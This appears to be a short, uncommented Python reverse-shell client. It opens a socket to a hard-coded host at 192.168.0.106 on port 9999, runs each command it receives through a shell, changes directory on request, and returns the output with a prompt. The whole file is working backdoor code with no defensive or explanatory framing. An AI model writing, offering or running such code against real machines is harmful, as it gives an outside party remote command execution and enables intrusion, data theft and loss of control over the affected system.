import os
import socket
import subprocess


soc = socket.socket()
host = '192.168.0.106'
port = 9999
soc.connect((host,port))

while True:
	data = soc.recv(1024)
	if data[:2].decode("ISO-8859-1") == 'cd':
		os.chdir(data[3:].decode("ISO-8859-1"))
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode("ISO-8859-1"), shell =True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, "ISO-8859-1")
		soc.send(str.encode(output_str + str(os.getcwd()) + '> '))
		print(output_str)

# Close connection
soc.close()
